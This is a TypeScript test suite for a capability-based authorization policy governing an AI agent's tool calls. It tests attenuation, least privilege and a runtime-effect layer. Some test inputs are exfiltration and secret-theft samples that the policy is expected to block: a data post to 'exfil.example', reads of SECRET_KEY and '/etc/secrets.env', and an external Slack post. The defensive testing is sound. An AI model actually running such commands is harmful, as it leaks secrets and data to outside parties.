import { beforeEach, describe, expect, it } from "vitest";
import {
  attenuate,
  buildAuthorizationContext,
  constraintsNarrow,
  type AgentEvent,
  type AuthorizationContext,
  type AuthorizationPolicy,
  type Capability,
  type PolicyDecision,
  type Principal,
  type TaskContract,
  type ToolCall,
} from "@tacl/core";
import { createA5Policy, DEFAULT_A5, DEFAULT_CAPABILITIES } from "./a5-capabilities";

function decide(policy: AuthorizationPolicy, ctx: AuthorizationContext): PolicyDecision {
  return policy.authorize(ctx) as PolicyDecision;
}

const principal: Principal = { id: "agent-1", roles: ["support-agent"] };
const task: TaskContract = {
  id: "task-1",
  principalId: "agent-1",
  purpose: "SUPPORT_OPS",
  allowedCapabilityClasses: [],
  prohibitedSinks: [],
  constraints: {},
};

function ctxFor(call: ToolCall, capabilities: Capability[]): AuthorizationContext {
  return {
    ...buildAuthorizationContext({ principal, task, proposedAction: call, trajectory: [] }),
    capabilities: { capabilities },
  };
}

describe("attenuation (SPEC §8 A5)", () => {
  it("child may narrow: amount.max 500 → 100 + extra customer binding", () => {
    const parent: Capability = { action: "billing.refund", constraints: { "amount.max": 500 } };
    const child: Capability = {
      action: "billing.refund",
      constraints: { "amount.max": 100, customer: "customer-123" },
    };
    expect(attenuate(parent, child)).toBe(true);
  });

  it("child may not widen: amount.max 500 → 1000", () => {
    const parent: Capability = { action: "billing.refund", constraints: { "amount.max": 500 } };
    const child: Capability = { action: "billing.refund", constraints: { "amount.max": 1000 } };
    expect(attenuate(parent, child)).toBe(false);
  });

  it("child may not change action (repo.read → repo.delete)", () => {
    const parent: Capability = { action: "repo.read", constraints: {} };
    const child: Capability = { action: "repo.delete", constraints: {} };
    expect(attenuate(parent, child)).toBe(false);
  });

  it("child must bind every parent constraint", () => {
    const parent: Capability = { action: "billing.refund", constraints: { "amount.max": 500 } };
    const child: Capability = { action: "billing.refund", constraints: {} };
    expect(constraintsNarrow(parent.constraints, child.constraints)).toBe(false);
  });

  it("prefix constraints narrow monotonically", () => {
    expect(
      constraintsNarrow({ "path.prefix": "/repo" }, { "path.prefix": "/repo/src" }),
    ).toBe(true);
    expect(
      constraintsNarrow({ "path.prefix": "/repo" }, { "path.prefix": "/other" }),
    ).toBe(false);
  });
});

describe("A5 tool authorization via capabilities", () => {
  const a5 = createA5Policy();

  it("allows tools covered by a capability", () => {
    const d = decide(
      a5,
      ctxFor({ tool: "crm.read", arguments: { customerId: "customer-123" } }, DEFAULT_CAPABILITIES),
    );
    expect(d.outcome).toBe("ALLOW");
    expect(d.reasons[0]).toContain("A5-CAPABILITY-001");
  });

  it("denies tools with no capability — scenario 1 exfil via missing external_post", () => {
    // DEFAULT_CAPABILITIES deliberately lacks slack.external_post (least privilege).
    const d = decide(
      a5,
      ctxFor(
        { tool: "slack.external_post", arguments: { channel: "#external-partners", text: "x" } },
        DEFAULT_CAPABILITIES,
      ),
    );
    expect(d.outcome).toBe("DENY");
    expect(d.reasons[0]).toContain("A5-CAPABILITY-MISSING-001");
  });

  it("denies argument/constraint violations", () => {
    const d = decide(
      a5,
      ctxFor(
        { tool: "billing.refund", arguments: { customerId: "customer-456", amount: 6 } },
        DEFAULT_CAPABILITIES,
      ),
    );
    expect(d.outcome).toBe("DENY");
    expect(d.reasons[0]).toContain("A5-CONSTRAINT-001");
  });

  it("respects narrowed child capabilities (customer binding)", () => {
    const narrowed: Capability[] = [
      { action: "billing.refund", constraints: { "amount.max": 100, customer: "customer-123" } },
    ];
    const ok = decide(
      a5,
      ctxFor({ tool: "billing.refund", arguments: { customerId: "customer-123", amount: 6 } }, narrowed),
    );
    const bad = decide(
      a5,
      ctxFor({ tool: "billing.refund", arguments: { customerId: "customer-456", amount: 6 } }, narrowed),
    );
    expect(ok.outcome).toBe("ALLOW");
    expect(bad.outcome).toBe("DENY");
  });

  it("scenario 6: child with repo.read only cannot delete (authority widening rejected)", () => {
    const childCaps: Capability[] = [{ action: "repo.read", constraints: {} }];
    const d = decide(
      a5,
      ctxFor({ tool: "repo.delete", arguments: { path: "src/main.ts" } }, childCaps),
    );
    expect(d.outcome).toBe("DENY");
    expect(d.reasons[0]).toContain("A5-CAPABILITY-MISSING-001");
  });
});

describe("A5 runtime-effect layer (SPEC §8, scenario 5)", () => {
  const a5 = createA5Policy();
  const execCaps: Capability[] = [{ action: "python.exec", constraints: {} }];

  function exec(script: string): ToolCall {
    return { tool: "python.exec", arguments: { script } };
  }

  it("tool layer allows python.exec — the capability exists", () => {
    // No blocked effects in the script → ALLOW.
    const d = decide(a5, ctxFor(exec('filesystem.read("/tmp/notes.txt")'), execCaps));
    expect(d.outcome).toBe("ALLOW");
  });

  it("effect layer blocks network egress even though the tool is authorized", () => {
    const d = decide(
      a5,
      ctxFor(exec('network.post("https://exfil.example", {"data": 1})'), execCaps),
    );
    expect(d.outcome).toBe("DENY");
    expect(d.reasons[0]).toContain("A5-EFFECT-POST-001");
  });

  it("effect layer blocks environment reads", () => {
    const d = decide(a5, ctxFor(exec('environment.read("SECRET_KEY")'), execCaps));
    expect(d.outcome).toBe("DENY");
    expect(d.reasons[0]).toContain("A5-EFFECT-READ-001");
  });

  it("effect layer blocks secret filesystem reads", () => {
    const d = decide(a5, ctxFor(exec('filesystem.read("/etc/secrets.env")'), execCaps));
    expect(d.outcome).toBe("DENY");
    expect(d.reasons[0]).toContain("A5-EFFECT-FS-001");
  });

  it("restrictions are configurable", () => {
    const permissive = createA5Policy({
      runtimeRestrictions: { "python.exec": [] },
      deniedFsReadPatterns: [],
    });
    const d = decide(permissive, ctxFor(exec('network.connect("x.example")'), execCaps));
    expect(d.outcome).toBe("ALLOW");
  });
});
